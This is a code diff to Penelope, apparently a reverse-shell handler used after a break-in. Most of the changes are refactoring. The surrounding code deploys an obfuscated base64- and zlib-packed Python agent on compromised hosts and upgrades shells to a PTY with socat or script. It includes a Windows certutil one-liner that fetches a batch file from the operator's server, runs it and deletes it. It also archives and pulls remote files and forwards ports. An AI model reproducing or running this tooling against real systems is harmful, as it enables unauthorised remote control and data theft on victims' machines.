@@ -731,8 +731,14 @@ class MainMenu(BetterCMD):
 
 	def set_id(self, ID):
 		self.sid = ID
-		session_part = f"{paint('─(').cyan_DIM}{paint('Session').green} {paint('[' + str(self.sid) + ']').red}{paint(')').cyan_DIM}" if self.sid else ''
-		self.prompt = f"{paint(f'(').cyan_DIM}{paint('Penelope').magenta}{paint(f')').cyan_DIM}{session_part}{paint('>').cyan_DIM} "
+		session_part = (
+				f"{paint('─(').cyan_DIM}{paint('Session').green} "
+				f"{paint('[' + str(self.sid) + ']').red}{paint(')').cyan_DIM}"
+		) if self.sid else ''
+		self.prompt = (
+				f"{paint(f'(').cyan_DIM}{paint('Penelope').magenta}{paint(f')').cyan_DIM}"
+				f"{session_part}{paint('>').cyan_DIM} "
+		)
 
 	def session(current=False, extra=[]):
 		def inner(func):
@@ -860,7 +866,12 @@ class MainMenu(BetterCMD):
 						else:
 							ID = paint(' ' + str(session.id)).yellow
 						source = session.listener or f'Connect({session._host}:{session.port})'
-						table += [ID, paint(session.type).CYAN if session.type == 'PTY' else session.type, session.user or 'N/A', source]
+						table += [
+							ID,
+							paint(session.type).CYAN if session.type == 'PTY' else session.type,
+							session.user or 'N/A',
+							source
+						]
 					print("\n", indent(str(table), "    "), "\n", sep="")
 			else:
 				print()
@@ -1935,7 +1946,7 @@ class Session:
 		self.name = f"{self.hostname}~{self.ip}" if self.hostname else self.ip
 
 		self.OS = None
-		self.type = None
+		self.type = 'Basic'
 		self.subtype = None
 		self.interactive = None
 		self.echoing = None
@@ -1978,6 +1989,7 @@ class Session:
 		self._can_deploy_agent = None
 
 		self.bypass_control_session = False
+		self.upgrade_attempted = False
 
 		self.id = core.new_sessionID
 		logger.debug(f"Assigned session ID: {self.id}")
@@ -2270,6 +2282,22 @@ class Session:
 
 		return self._tmp
 
+	@staticmethod
+	def agent_only(func):
+		@wraps(func)
+		def newfunc(self, *args, **kwargs):
+			if not self.agent:
+				if not self.upgrade_attempted and self.can_deploy_agent:
+					logger.warning("This can only run in python agent mode. I am trying to deploy the agent")
+					self.upgrade()
+					if not self.agent:
+						logger.error("Failed to deploy agent")
+						return False
+				else:
+					logger.error("This can only run in python agent mode")
+					return False
+			return func(self, *args, **kwargs)
+		return newfunc
 
 	def send(self, data, stdin=False):
 		with self.wlock: #TODO
@@ -2325,7 +2353,11 @@ class Session:
 			elif f"The term '{var_name1}={var_value1}' is not recognized as the name of a cmdlet" in data:
 				return re.search('or operable.*>', data, re.DOTALL)
 
-		response = self.exec(f" {var_name1}={var_value1} {var_name2}={var_value2}; echo ${var_name1}${var_name2}\n", raw=True, expect_func=expect)
+		response = self.exec(
+			f" {var_name1}={var_value1} {var_name2}={var_value2}; echo ${var_name1}${var_name2}\n",
+			raw=True,
+			expect_func=expect
+		)
 		if response:
 			response = response.decode()
 
@@ -2359,7 +2391,11 @@ class Session:
 				if var_value1 + var_value2 in data:
 					return True
 
-			response = self.exec(f"${var_name1}='{var_value1}'; ${var_name2}='{var_value2}'; echo ${var_name1}${var_name2}\r\n", raw=True, expect_func=expect)
+			response = self.exec(
+				f"${var_name1}='{var_value1}'; ${var_name2}='{var_value2}'; echo ${var_name1}${var_name2}\r\n",
+				raw=True,
+				expect_func=expect
+			)
 			if not response:
 				return False
 			response = response.decode()
@@ -2374,7 +2410,12 @@ class Session:
 				if var_name1 in response and not f"echo ${var_name1}${var_name2}" in response:
 					self.type = 'PTY'
 					columns, lines = shutil.get_terminal_size()
-					cmd = f"$width={columns}; $height={lines}; $Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height); $Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size -ArgumentList ($width, $height)"
+					cmd = (
+						f"$width={columns}; $height={lines}; "
+						f"$Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height); "
+						f"$Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size "
+						f"-ArgumentList ($width, $height)"
+					)
 					self.exec(cmd)
 					self.prompt = response.splitlines()[-2].encode()
 				else:
@@ -2431,7 +2472,13 @@ class Session:
 						return
 
 				_type = 'S'.encode() if not python else 'P'.encode()
-				self.send(Messenger.message(Messenger.EXEC, _type + stdin_stream.id + stdout_stream.id + stderr_stream.id + cmd.encode()))
+				self.send(Messenger.message(
+					Messenger.EXEC, _type +
+					stdin_stream.id +
+					stdout_stream.id +
+					stderr_stream.id +
+					cmd.encode()
+				))
 				logger.debug(cmd)
 				#print(stdin_stream.id, stdout_stream.id, stderr_stream.id)
 
@@ -2591,7 +2638,8 @@ class Session:
 								f"echo $env:{token[0]}$env:{token[2]};{cmd.decode()};"
 								f"echo $env:{token[2]}$env:{token[0]}\r\n".encode()
 							)
-						if self.subtype == 'cmd' and len(cmd) > MAX_CMD_PROMPT_LEN: # TODO check the maxlength on powershell
+						# TODO check the maxlength on powershell
+						if self.subtype == 'cmd' and len(cmd) > MAX_CMD_PROMPT_LEN:
 							logger.error(f"Max cmd prompt length: {MAX_CMD_PROMPT_LEN} characters")
 							return False
 
@@ -2741,21 +2789,21 @@ class Session:
 		return self.need_binary(name, url)
 
 	def upgrade(self):
+		self.upgrade_attempted = True
 		if self.OS == "Unix":
 			if self.agent:
-				logger.warning("Python agent is already deployed")
+				logger.warning("Python Agent is already deployed")
 				return False
 
 			if self.need_control_sessions and self.control_sessions == [self]:
 				logger.warning("This is a control session and cannot be upgraded")
 				return False
 
-			if self.type == "PTY":
+			if self.pty_ready:
 				if self.can_deploy_agent:
-					logger.info("Attempting to deploy agent...")
-				elif not self.pty_ready:
-					logger.warning("This shell is already PTY and Python agent cannot be deployed...")
-					return False
+					logger.info("Attempting to deploy Python Agent...")
+				else:
+					logger.warning("This shell is already PTY")
 			else:
 				logger.info("Attempting to upgrade shell to PTY...")
 
@@ -2763,9 +2811,7 @@ class Session:
 			if not self.shell:
 				logger.warning("Cannot detect shell. Abort upgrading...")
 				return False
-			SH = self.bin['sh'] or self.bin['bash']
 
-			socat_cmd = f"{{}} - exec:{self.shell},pty,stderr,setsid,sigint,sane;exit 0"
 			if self.can_deploy_agent:
 				_bin = self.bin['python3'] or self.bin['python']
 				if self.remote_python_version >= (3,):
@@ -2775,39 +2821,48 @@ class Session:
 					_decode = 'decodestring'
 					_exec = 'exec cmd in globals(), locals()'
 
-				agent = dedent('\n'.join(AGENT.splitlines()[1:])).format(self.shell, options.network_buffer_size, MESSENGER, STREAM, SH, _exec)
+				agent = dedent('\n'.join(AGENT.splitlines()[1:])).format(
+					self.shell,
+					options.network_buffer_size,
+					MESSENGER,
+					STREAM,
+					self.bin['sh'] or self.bin['bash'],
+					_exec
+				)
 				payload = base64.b64encode(compress(agent.encode(), 9)).decode()
 				cmd = f'{_bin} -Wignore -c \'import base64,zlib;exec(zlib.decompress(base64.{_decode}("{payload}")))\''
 
-			elif self.bin['script']:
-				_bin = self.bin['script']
-				cmd = f"{_bin} -q /dev/null; exit 0"
+			elif not self.pty_ready:
+				socat_cmd = f"{{}} - exec:{self.shell},pty,stderr,setsid,sigint,sane;exit 0"
+				if self.bin['script']:
+					_bin = self.bin['script']
+					cmd = f"{_bin} -q /dev/null; exit 0"
 
-			elif self.bin['socat']:
-				_bin = self.bin['socat']
-				cmd = socat_cmd.format(_bin)
-
-			else:
-				_bin = self.tmp + '/socat'
-				if not self.exec(f"test -f {_bin} || echo x"): # TODO maybe needs rstrip
+				elif self.bin['socat']:
+					_bin = self.bin['socat']
 					cmd = socat_cmd.format(_bin)
+
 				else:
-					logger.warning("Cannot upgrade shell with the available binaries...")
-					socat_binary = self.need_binary("socat", URLS['socat'])
-					if socat_binary:
-						_bin = socat_binary
+					_bin = self.tmp + '/socat'
+					if not self.exec(f"test -f {_bin} || echo x"): # TODO maybe needs rstrip
 						cmd = socat_cmd.format(_bin)
 					else:
-						if readline:
-							logger.info("Readline support enabled")
-							self.readline = True
-							return True
+						logger.warning("Cannot upgrade shell with the available binaries...")
+						socat_binary = self.need_binary("socat", URLS['socat'])
+						if socat_binary:
+							_bin = socat_binary
+							cmd = socat_cmd.format(_bin)
 						else:
-							logger.error("Falling back to basic shell support")
-							return False
+							if readline:
+								logger.info("Readline support enabled")
+								self.readline = True
+								return True
+							else:
+								logger.error("Falling back to basic shell support")
+								return False
 
 			if not self.can_deploy_agent and not self.spare_control_sessions: #### TODO
-				logger.warning("Python agent cannot be deployed. I need to maintain at least one basic session...")
+				logger.warning("Python agent cannot be deployed. I need to maintain at least one basic session to handle the PTY")
 				core.session_wait_host = self.name
 				self.spawn()
 				try:
@@ -2818,14 +2873,8 @@ class Session:
 					logger.error("Failed spawning new session")
 					return False
 
-				if self.type == 'PTY':
-					self.attach()
-				else:
-					new_session.attach()
-
-				new_session.get_shell_info()
-
-				return True
+				if self.pty_ready:
+					return True
 
 			if self.pty_ready:
 				self.exec("stty -echo")
@@ -2841,10 +2890,15 @@ class Session:
 				self.echoing = False
 
 			def expect(data):
-				if not self.can_deploy_agent or b"\x01" in data:
+				if not self.can_deploy_agent or b"\x01" in data: # TO FIX
 					return True
 
-			response = self.exec(f'export TERM=xterm-256color; export SHELL={self.shell}; {cmd}', separate=self.can_deploy_agent, expect_func=expect, raw=True)
+			response = self.exec(
+				f'export TERM=xterm-256color; export SHELL={self.shell}; {cmd}',
+				separate=self.can_deploy_agent,
+				expect_func=expect,
+				raw=True
+			)
 			if not isinstance(response, bytes):
 				logger.error("The shell became unresponsive. I am killing it, sorry... Next time I will not try to deploy agent")
 				Path(self.directory / ".noagent").touch()
@@ -2853,11 +2907,11 @@ class Session:
 
 			logger.info(f"Shell upgraded successfully using {paint(_bin).yellow}{paint().green}! 💪")
 
-			self.agent = 		self.can_deploy_agent
-			self.type =		'PTY'
-			self.interactive =	 True
-			self.echoing =		 True
-			self.prompt =		response
+			self.agent = self.can_deploy_agent
+			self.type = 'PTY'
+			self.interactive = True
+			self.echoing = True
+			self.prompt = response
 
 			self.get_shell_info()
 
@@ -2874,7 +2928,11 @@ class Session:
 			if self.agent:
 				self.send(Messenger.message(Messenger.RESIZE, struct.pack("HH", lines, columns)))
 			else: # TODO
-				threading.Thread(target=self.exec, args=(f"stty rows {lines} columns {columns} -F {self.tty}",), name="RESIZE").start() #TEMP
+				threading.Thread(
+					target=self.exec,
+					args=(f"stty rows {lines} columns {columns} -F {self.tty}",),
+					name="RESIZE"
+				).start() #TEMP
 		elif self.OS == 'Windows': # TODO
 			pass
 
@@ -2906,9 +2964,13 @@ class Session:
 			if self.new:
 				self.new = False
 				self.bypass_control_session = True
-				if not options.no_upgrade:
-					if not (self.need_control_session and self.control_sessions == [self]):
-						self.upgrade()
+				upgrade_conditions = [
+					not options.no_upgrade,
+					not (self.need_control_session and self.control_sessions == [self]),
+					not self.upgrade_attempted
+				]
+				if all(upgrade_conditions):
+					self.upgrade()
 				self.bypass_control_session = False
 
 				if self.prompt:
@@ -2919,9 +2981,6 @@ class Session:
 
 		if core.attached_session is not None:
 			return False
-
-		#core.output_line_buffer.lines.pop()
-		#core.wait_input = False
 
 		if self.type == 'PTY':
 			escape_key = options.escape['key']
@@ -3013,7 +3072,10 @@ class Session:
 			if self.agent:
 				block_size = os.statvfs(local_download_folder).f_frsize
 				response = self.exec(f"{GET_GLOB_SIZE}"
-					f"stdout_stream << str(get_glob_size({repr(remote_items)}, {block_size})).encode()", python=True, value=True)
+					f"stdout_stream << str(get_glob_size({repr(remote_items)}, {block_size})).encode()",
+					python=True,
+					value=True
+				)
 				try:
 					remote_size = int(float(response))
 				except:
@@ -3102,7 +3164,7 @@ class Session:
 				tar_source, mode = stdout_stream, "r|gz"
 			else:
 				temp = self.tmp + "/" + rand(8)
-				cmd = rf'for file in {remote_items};do readlink -f "$file";done | xargs -d "\n" tar cz | base64 -w0 > {temp}'
+				cmd = rf'for file in {remote_items};do readlink -f "$file";done|xargs -d"\n" tar cz|base64 -w0 > {temp}'
 				response = self.exec(cmd, timeout=None, value=True)
 				if not response:
 					logger.error("Cannot create archive")
@@ -3215,7 +3277,9 @@ class Session:
 			temp_remote_file_bat = urlpath_bat.split("/")[-1]
 			server.start()
 			data = self.exec(
-				f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_bat}" "%TEMP%\\{temp_remote_file_bat}" >NUL 2>&1&"%TEMP%\\{temp_remote_file_bat}"&del "%TEMP%\\{temp_remote_file_bat}"',
+				f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_bat}" '
+				f'"%TEMP%\\{temp_remote_file_bat}" >NUL 2>&1&"%TEMP%\\{temp_remote_file_bat}"&'
+				f'del "%TEMP%\\{temp_remote_file_bat}"',
 				force_cmd=True, value=True, timeout=None)
 			server.stop()
 
@@ -3247,7 +3311,11 @@ class Session:
 		try:
 			if self.OS == 'Unix':
 				if self.agent:
-					if not eval(self.exec(f"stdout_stream << str(os.access('{destination}', os.W_OK)).encode()", python=True, value=True)):
+					if not eval(self.exec(
+						f"stdout_stream << str(os.access('{destination}', os.W_OK)).encode()",
+						python=True,
+						value=True
+					)):
 						logger.error(f"{destination}: Permission denied")
 						return []
 				else:
@@ -3506,10 +3574,8 @@ class Session:
 
 		return altnames
 
+	@agent_only
 	def script(self, local_script):
-		if not self.agent:
-			logger.error("This can only be run in python agent mode: Try to 'upgrade' the session first")
-			return False
 
 		local_script_folder = self.directory / "scripts"
 		prefix = datetime.now().strftime("%Y_%m_%d-%H_%M_%S-")
@@ -3562,7 +3628,7 @@ class Session:
 			logger.error(e)
 			return False
 
-		return True
+		return output_file_name
 
 	def spawn(self, port=None, host=None):
 
@@ -3618,6 +3684,7 @@ class Session:
 
 		return True
 
+	@agent_only
 	def portfwd(self, _type, lhost, lport, rhost, rport):
 
 		session = self
@@ -3975,7 +4042,6 @@ def agent():
 
 	try:
 		streams = dict()
-
 		messenger = Messenger(bufferclass)
 		outbuf = bufferclass()
 		ttybuf = bufferclass()
@@ -4033,12 +4099,13 @@ def agent():
 							fcntl.ioctl(master_fd, termios.TIOCSWINSZ, _value)
 
 						elif _type == Messenger.EXEC:
-							_type, stdin_stream_id, stdout_stream_id, stderr_stream_id, cmd = \
-							_value[:1], \
-							_value[1:Messenger.STREAM_BYTES + 1], \
-							_value[Messenger.STREAM_BYTES + 1:Messenger.STREAM_BYTES * 2 + 1], \
-							_value[Messenger.STREAM_BYTES * 2 + 1:Messenger.STREAM_BYTES * 3 + 1], \
-							_value[Messenger.STREAM_BYTES * 3 + 1:]
+							sb = str(Messenger.STREAM_BYTES)
+							header_size = 1 + int(sb) * 3
+							__type, stdin_stream_id, stdout_stream_id, stderr_stream_id = struct.unpack(
+								'!c' + (sb + 's') * 3,
+								_value[:header_size]
+							)
+							cmd = _value[header_size:]
 
 							if not stdin_stream_id in streams:
 								streams[stdin_stream_id] = Stream(stdin_stream_id)
@@ -4054,7 +4121,7 @@ def agent():
 							rlist.append(stdout_stream)
 							rlist.append(stderr_stream)
 
-							if _type == 'S'.encode():
+							if __type == 'S'.encode():
 								pid = os.fork()
 								if pid == 0:
 									os.dup2(stdin_stream._read, 0)
@@ -4066,7 +4133,7 @@ def agent():
 								os.close(stdout_stream._write)
 								os.close(stderr_stream._write)
 
-							elif _type == 'P'.encode():
+							elif __type == 'P'.encode():
 								def run(stdin_stream, stdout_stream, stderr_stream):
 									try:
 										{}
@@ -4303,7 +4370,10 @@ class FileServer:
 			output.extend(('', '🏠 http://' + str(paint(ip).cyan) + ":" + str(paint(self.port).red) + '/' + self.password))
 			table = Table(joinchar=' → ')
 			for urlpath, filepath in self.filemap.items():
-				table += (paint(f"{'📁' if os.path.isdir(filepath) else '📄'} ").green + paint(f"http://{ip}:{self.port}{urlpath}").white_BLUE, filepath)
+				table += (
+					paint(f"{'📁' if os.path.isdir(filepath) else '📄'} ").green +
+					paint(f"http://{ip}:{self.port}{urlpath}").white_BLUE, filepath
+				)
 			output.append(str(table))
 			output.append("─" * len(output[1]))
 
@@ -4392,7 +4462,10 @@ class FileServer:
 
 				response = getattr(paint(f"{response[0]} {response[1]} {response[3]}\""), color)
 
-				logger.info(f"{paint('[').white}{paint(self.log_date_time_string()).magenta}] FileServer({host}:{port}) [{paint(self.address_string()).cyan}] {response}")
+				logger.info(
+					f"{paint('[').white}{paint(self.log_date_time_string()).magenta}] "
+					f"FileServer({host}:{port}) [{paint(self.address_string()).cyan}] {response}"
+				)
 
 		with CustomTCPServer((self.host, self.port), CustomHandler, bind_and_activate=False) as self.httpd:
 			if not self.httpd.server_bind(self.host, self.port):
